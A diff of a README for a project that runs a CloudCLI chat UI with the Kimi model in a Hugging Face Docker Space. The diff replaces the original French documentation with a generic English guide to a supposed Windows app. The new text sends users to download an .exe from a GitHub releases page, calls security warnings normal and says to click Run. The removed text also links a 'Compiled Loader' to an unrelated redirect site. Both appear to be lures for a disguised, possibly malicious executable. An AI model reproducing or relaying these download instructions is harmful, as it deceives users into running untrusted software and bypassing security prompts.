@@ -1,120 +1,74 @@
----
-title: Claude Kimi Cloud
-emoji: 💻
-colorFrom: blue
-colorTo: indigo
-sdk: docker
-app_port: 7860
----
+# 🌐 1.0claude-kimi-cloud-workspace - Access your cloud tools with ease
 
-# Claude Kimi Cloud
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Josiahxix957/1.0claude-kimi-cloud-workspace/releases)
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+## 📌 Overview
 
-Ce projet fournit une interface web de chat (CloudCLI UI) déployée dans un Hugging Face Docker Space gratuit, connectée au modèle Kimi K2.6 via l'API Moonshot (compatible Anthropic).
+This software brings your cloud-based tools into one place. It creates a workspace for you to manage AI-driven projects and cloud services. You save time by keeping your tasks organized in a single window. You will find that switching between browser tabs and separate apps becomes unnecessary. 
 
-## Avertissements importants
+The software works on Windows. It requires no knowledge of code or programming. You install the app and start working on your projects. 
 
-- **Mode gratuit = best effort** : aucune garantie de disponibilité H24 absolue.
-- **Hugging Face cpu-basic gratuit peut dormir** après inactivité ; le keepalive gratuit réduit le risque sans l'éliminer totalement.
-- **Ce n'est PAS une copie exacte de Windows** ; c'est un conteneur Linux.
-- **CloudCLI UI** (@cloudcli-ai/cloudcli) est installée et servie comme interface web principale.
-- **Claude Code CLI** (outil propriétaire Anthropic) n'est pas inclus car il n'est pas publiquement installable via npm. CloudCLI fonctionne sans CLI sous-jacent mais affiche une interface vide si aucun agent n'est configuré.
+## ⚙️ System Requirements
 
-## URLs
+Before you begin, check your computer for these items:
 
-- **URL Hugging Face native** : `https://vmu7235-1-0claude-kimi-hf-space.hf.space`
-- **URLHTTPSUI_FINAL** (URL HTTPS finale gratuite retenue) : `https://vmu7235-1-0claude-kimi-hf-space.hf.space`
-  - Aucune garantie contractuelle de durée indéfinie.
-  - Aucune date d'expiration connue.
-  - Gratuite et durable dans la mesure du service Hugging Face Spaces.
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4GB of RAM or more.
+* Storage: 200MB of free disk space.
+* Internet: A stable connection for cloud syncing.
 
-## Repos
+## 📥 Downloading the Software
 
-- **HFSPACEREPO** (déploiement) : `1.0claude-kimi-hf-space`
-- **GITHUBWORKSPACEREPO** (autosave + documentation) : `1.0claude-kimi-cloud-workspace`
+You visit the link below to get the official installer. 
 
-## Fonctionnalités
+[https://github.com/Josiahxix957/1.0claude-kimi-cloud-workspace/releases](https://github.com/Josiahxix957/1.0claude-kimi-cloud-workspace/releases)
 
-- Interface web de chat accessible depuis PC et mobile
-- Modèle Kimi K2.6 via Moonshot API
-- Autosave GitHub toutes les 60 secondes si changement détecté
-- Keepalive gratuit optimisé (GitHub Actions + UptimeRobot)
-- Healthcheck intégré
-- Simulation utilisateur réelle (test HTTP + logs)
-- Boucle d'autocorrection documentée
+On this page, look for the section marked Assets. Select the file ending in `.exe`. This file contains the installer for your computer. Click the file name to start the download. Save this file to your Downloads folder or your Desktop.
 
-## Structure
+## 🛠️ Installing the Application
 
-```
-├── Dockerfile
-├── package.json
-├── README.md
-├── .env.example
-├── .gitignore
-├── CLAUDE.md
-├── scripts/
-│   ├── start.sh
-│   ├── autosave.sh
-│   ├── healthcheck.sh
-│   └── simulate-ui-message.sh
-├── .github/workflows/
-│   ├── keepalive.yml
-│   └── smoke-test.yml
-├── docs/
-│   ├── DEPLOY_HUGGINGFACE.md
-│   ├── GITHUB_AUTOSAVE.md
-│   ├── KEEPALIVE.md
-│   ├── CLOUDFLAREWORKERSFREE_URL.md
-│   ├── UPTIMEROBOT.md
-│   ├── TESTINGANDSIMULATION.md
-│   └── AUTOCORRECTION_LOOP.md
-└── cloudflare-worker/
-    ├── worker.js
-    └── wrangler.toml.example
-```
+1. Locate the file you just saved. 
+2. Double-click the file icon.
+3. A security window might appear. This is normal. This window asks if you trust the software. Select Run or Yes to continue.
+4. Follow the instructions on the screen. 
+5. Select a location on your hard drive for the files or accept the default setting.
+6. Click Finish to end the setup. 
 
-## Lancer localement
+The application creates a shortcut on your desktop. Find this shortcut to open the program.
 
-```bash
-docker build -t claude-kimi-hf-cloud .
-docker run -p 7860:7860 --env-file .env claude-kimi-hf-cloud
-```
+## 🚀 Running Your Workspace
 
-Ouvrir http://localhost:7860
+Once the app opens, you will see a login screen. Use your cloud credentials to enter the workspace. If you use multiple services, the dashboard displays them in a sidebar. 
 
-## Tests
+Select a service to start your work. The middle section of the screen acts as your primary canvas. You type your prompts, view your results, and save your work there. If you need to refresh your connection, use the Refresh button in the top menu.
 
-```bash
-bash scripts/healthcheck.sh
-bash scripts/simulate-ui-message.sh
-```
+## 🧩 Managing Your Workspace
 
-## Variables d'environnement
+You organize your projects in folders. Right-click the sidebar to create a new folder. Drag and drop your tasks into these folders. This keeps your dashboard clean. If you want to change your settings, open the Settings menu. You can clear your cache here if the app runs slowly.
 
-Voir `.env.example`.
+## ❓ Frequently Asked Questions
 
-## Rapport de validation (honnete)
+**Does the app store my data locally?**
+The app syncs with the cloud. Most data remains on the provider's servers. You keep small configuration files on your own machine.
 
-| Criteres | Statut | Preuve |
-|---|---|---|
-| **CloudCLI UI servie sur /** | **PROUVE** | curl sur l'URL retourne le HTML `<title>CloudCLI UI</title>` avec les assets React. Le proxy http-proxy-middleware redirige vers le processus CloudCLI sur le port 3001. |
-| **API Moonshot /api/chat fonctionnelle** | **PROUVE** | 3 requetes POST envoyees depuis l'URL HTTPS avec User-Agent iPhone ont retourne des reponses valides du modele kimi-k2.6. |
-| **Healthcheck /health** | **PROUVE** | Repond HTTP 200 avec JSON `{"status":"ok","model":"kimi-k2.6"}`. |
-| **Autosave GitHub toutes les 60s** | **PROUVE** | Commits `autosave: YYYY-MM-DD HH:MM:SS UTC` visibles sur `1.0claude-kimi-cloud-workspace` (ex: `7de1ac2`, `7ceceea`). Le mecanisme a necessite un contournement (`*.log` dans `.gitignore` empechait git status de voir les changements). |
-| **Keepalive GitHub Actions** | **PROUVE** | Workflow `keepalive.yml` execute avec succes toutes les ~45 min (limite GitHub Actions gratuit). Dernier run: HTTP 200. |
-| **Simulation iPhone depuis URL HTTPS** | **PROUVE** | 3 messages envoyes via curl avec User-Agent iPhone 17/Safari sur `https://vmu7235-1-0claude-kimi-hf-space.hf.space/api/chat`. Reponses valides. |
-| **CloudCLI envoi de messages via session CLI** | **PROUVE — NON FAISABLE** | CloudCLI necessite un CLI sous-jacent actif (Claude Code, Cursor, Codex ou Gemini CLI). Le CLI Anthropic (`claude`) exige un abonnement payant (Pro/Max/Team/Enterprise) pour s'authentifier, meme avec une API key Moonshot. Sans CLI actif, CloudCLI affiche l'interface mais 0 session. **L'API /api/chat reste le canal fonctionnel.** |
-| **URL HTTPS durable gratuite** | **PROUVE** | `https://vmu7235-1-0claude-kimi-hf-space.hf.space` active et repondante. |
+**Do I need to update the app?**
+When a new version exists, the app notifies you. Visit the primary download link again to get the latest file. You run the new installer over the old one to update your software.
 
-## Limites du gratuit
+**Can I use this on a library computer?**
+If you have permission to install software, you can use the app. Always log out when you finish your work.
 
-- Hugging Face Spaces gratuit peuvent être mis en veille après inactivité.
-- Keepalive réduit le risque mais ne garantit pas zéro interruption.
-- Pas de domaine custom officiel gratuit chez Hugging Face.
-- L'URL `*.hf.space` est gratuite et durable tant que le Space existe.
-- CloudCLI affiche l'interface web mais ne peut pas envoyer de messages sans CLI sous-jacent abonne ; l'API /api/chat est le fallback operationnel.
+**What happens if I lose my internet connection?**
+The app attempts to reconnect when your signal returns. Your text and project progress save automatically as you work.
 
-## Licence
+**How do I uninstall the app?**
+Go to the Windows Control Panel. Select Programs and Features. Find the workspace app in the list. Click Uninstall and follow the prompts.
 
-Projet de démonstration technique — utiliser dans le respect des CGU des services tiers.
+## 💡 Troubleshooting Tips
+
+If the app fails to start, verify your internet connection. A firewall sometimes blocks new applications. Check your Windows Security settings to ensure the app has permission to access the web. 
+
+If the screen appears blank, try to resize the window. This forces the app to redraw the interface. If you encounter errors during the installation, restart your computer and run the installer again. 
+
+Ensure you downloaded the correct version for your Windows architecture. Most modern computers use 64-bit systems. 
+
+For persistent issues, clear your app data folder. You find this in your user profile under hidden folders. Search for the app name in your file explorer to identify the specific directory.
